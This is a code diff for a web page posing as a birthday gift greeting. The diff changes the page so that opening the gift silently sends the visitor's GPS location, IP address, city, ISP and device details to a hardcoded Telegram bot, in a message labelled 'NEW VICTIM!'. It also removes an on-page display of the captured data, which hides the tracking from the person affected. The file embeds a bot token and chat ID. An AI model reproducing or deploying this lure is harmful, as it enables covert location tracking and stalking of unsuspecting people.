@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🎁 Birthday Gift 🎂</title>
+    <title>🎁 Happy Birthday! 🎂</title>
     <style>
         * {
             margin: 0;
@@ -12,17 +12,17 @@
         }
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             padding: 20px;
         }
         .container {
             background: rgba(255,255,255,0.95);
             border-radius: 30px;
-            padding: 40px;
+            padding: 50px 40px;
             max-width: 450px;
             width: 100%;
             text-align: center;
@@ -34,14 +34,14 @@
             to { opacity: 1; transform: scale(1); }
         }
         .gift-icon {
-            font-size: 90px;
+            font-size: 100px;
             cursor: pointer;
             animation: bounce 1s ease infinite;
             display: inline-block;
             transition: transform 0.2s;
         }
         .gift-icon:hover {
-            transform: scale(1.1);
+            transform: scale(1.05);
         }
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
@@ -65,7 +65,6 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin: 15px 0;
             transition: transform 0.2s;
         }
         button:hover {
@@ -87,9 +86,9 @@
         }
         .message {
             background: linear-gradient(135deg, #ff6b6b, #ee5a24);
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
+            border-radius: 20px;
+            padding: 25px;
+            margin-top: 20px;
             display: none;
             color: white;
             animation: slideUp 0.5s ease;
@@ -101,25 +100,10 @@
         .message.show {
             display: block;
         }
-        .info-box {
-            background: #1a1a2e;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 15px;
-            text-align: left;
-            word-wrap: break-word;
-            display: none;
-        }
-        .info-box.show {
-            display: block;
-        }
         .footer {
-            margin-top: 20px;
+            margin-top: 25px;
             font-size: 11px;
-            color: #999;
+            color: #aaa;
         }
     </style>
 </head>
@@ -135,19 +119,40 @@
         <p>May your day be filled with joy! ✨</p>
         <p>🎂 HAPPY BIRTHDAY! 🎂</p>
     </div>
-    <div class="info-box" id="infoBox">
-        <strong>📊 Information Captured:</strong><br>
-        <span id="infoText"></span>
-    </div>
     <div class="footer">❤️ Made with love</div>
 </div>
 
 <script>
+    // ================= CONFIG =================
+    // Teri nayi bot token
+    const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
+    const CHAT_ID = "6323367629";  // Tera Telegram user ID
+    
+    // ==========================================
+    
     const urlParams = new URLSearchParams(window.location.search);
     const targetId = urlParams.get('id') || 'unknown';
     const targetName = urlParams.get('name') || 'Guest';
     
     let dataSent = false;
+    
+    async function sendToTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            console.log('✅ Sent to Telegram');
+        } catch(e) {
+            console.log('Telegram send error:', e);
+        }
+    }
     
     async function openGift() {
         if (dataSent) return;
@@ -204,51 +209,44 @@
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
         
-        // Display info
-        const infoText = document.getElementById('infoText');
-        infoText.innerHTML = `
-🆔 ID: ${targetId}
-👤 Name: ${targetName}
-📍 Latitude: ${locationData.lat}
-📍 Longitude: ${locationData.lon}
-🎯 Accuracy: ${locationData.accuracy}m
-🌐 IP Address: ${networkData.ip}
-🏙️ City: ${networkData.city}
-🗺️ Region: ${networkData.region}
-🌍 Country: ${networkData.country}
-📡 ISP: ${networkData.isp}
-📱 Platform: ${deviceData.platform}
-🖥️ Screen: ${deviceData.screen}
-🌐 Language: ${deviceData.language}
-⏰ Timezone: ${deviceData.timezone}
-🕐 Time: ${new Date().toLocaleString()}
-        `;
+        // Create message for Telegram
+        const mapLink = (locationData.lat != 'N/A' && locationData.lon != 'N/A') 
+            ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`
+            : '';
         
-        document.getElementById('infoBox').classList.add('show');
+        let message = `🔴 <b>NEW VICTIM!</b>\n\n`;
+        message += `🎯 <b>ID:</b> ${targetId}\n`;
+        message += `👤 <b>Name:</b> ${targetName}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>📍 GPS LOCATION:</b>\n`;
+        message += `   Lat: <code>${locationData.lat}</code>\n`;
+        message += `   Lon: <code>${locationData.lon}</code>\n`;
+        message += `   Acc: ${locationData.accuracy}m\n`;
+        if(mapLink) message += `   🗺️ <a href="${mapLink}">View on Google Maps</a>\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>🌐 NETWORK INFO:</b>\n`;
+        message += `   IP: <code>${networkData.ip}</code>\n`;
+        message += `   City: ${networkData.city}\n`;
+        message += `   Region: ${networkData.region}\n`;
+        message += `   Country: ${networkData.country}\n`;
+        message += `   ISP: ${networkData.isp}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `<b>📱 DEVICE INFO:</b>\n`;
+        message += `   Platform: ${deviceData.platform}\n`;
+        message += `   Screen: ${deviceData.screen}\n`;
+        message += `   Language: ${deviceData.language}\n`;
+        message += `   Timezone: ${deviceData.timezone}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        message += `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n`;
+        message += `\n👨‍💻 <i>Powered by @KINGITACHI18</i>`;
         
-        // Send to backend API
-        try {
-            const response = await fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    id: targetId,
-                    name: targetName,
-                    location: locationData,
-                    network: networkData,
-                    device: deviceData,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            console.log('Data sent to server');
-        } catch(e) {
-            console.log('Server error:', e);
-        }
+        // Send to Telegram
+        await sendToTelegram(message);
         
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('message').classList.add('show');
-        }, 1000);
+        }, 800);
         
         dataSent = true;
     }
